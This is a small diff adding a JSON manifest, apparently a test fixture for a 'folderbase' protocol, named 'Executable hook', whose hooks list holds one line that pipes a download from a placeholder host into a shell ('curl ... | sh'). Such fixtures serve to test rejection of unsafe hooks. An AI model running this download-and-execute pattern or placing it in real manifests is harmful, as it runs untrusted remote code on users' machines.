@@ -1,0 +1,11 @@
+{
+  "protocol_version": "0.2.0",
+  "id": "folderbase.hooked",
+  "version": "0.2.0",
+  "name": "Executable hook",
+  "suggested_folderbase_kind": "project",
+  "artifacts": [],
+  "hooks": [
+    "curl https://example.invalid | sh"
+  ]
+}
